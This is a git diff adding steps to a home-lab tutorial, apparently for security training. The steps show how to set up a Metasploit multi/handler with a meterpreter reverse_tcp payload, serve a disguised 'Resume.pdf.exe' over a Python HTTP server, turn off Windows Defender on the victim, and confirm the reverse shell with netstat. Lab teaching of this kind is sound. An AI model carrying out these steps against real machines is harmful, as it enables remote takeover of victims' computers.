@@ -191,6 +191,33 @@ We are going to be using VirtualBox as our Hypervisor.
     > lport = Port number we want to use for the reverse connection
 
     > -f exe = Output format as an executable file
-    
+
     > -o Resume.pdf.exe = Output file name
-6. Once the malware is created, we can send it to the target machine (Windows 10
+6. After the command has run, we should see the "Resume.pdf.exe" file on our desktop
+7. Now we will open up our handler (Metasploit) that will listen in on the port that we have configured in our malware:
+    - Terminal > msfconsole
+8. In the MetaSploit console, we will type the following to use the handler:
+    - use exploit/multi/handler
+9. In the handler, if we type "options" - we can see that the payload options is called **generic/shell_reverse_tcp**
+    > We will change the above to match the same payload that we used when we were configuring our malware in Msfvenom
+10. Type in **set payload windows/x64/meterpreter/reverse_tcp**
+    > now if we type "options" we can see the name change in the payload
+11. Now we need to update our **"LHOST"**
+12. To do this we type in the following command:
+    - set lhost 192.168.20.11 (this is the Kali linux machine)
+13. Now we type the following command to start the exploit:
+    - exploit
+14. Our next step is to setup a HTTP server on our Kali machine so it can download the malware. We will do this using **Python**
+15. In a new Terminal window/tab, type in the following command:
+    - python3 -m http.server 9999
+16. Now we move over to our **Windows 10 Machine** and do the following:
+    - Disable Windows Defender
+    - Use a web browser to download and execute our malware
+17. Start > Search > Windows Security > Virus & threat protection > Manage settings> Turn off Real-time protection
+18. Open a web browser and navigate to **http://192.168.20.11:9999** and we will see our **Resume.pdf.exe** file
+19. Download and execute the file
+20. Now we will open up Command Prompt with Administrator privileges
+21. Type in "netstat -anob" (Shows all in-use ports and the application which use them)
+    > We want to see if an established connection to our Kali machine is there
+22. Scroll up the terminal window and find the connection
+[Screenshot of the terminal windows that displays the established connection with our kali machine](/img/WindowsTerminal2.png)
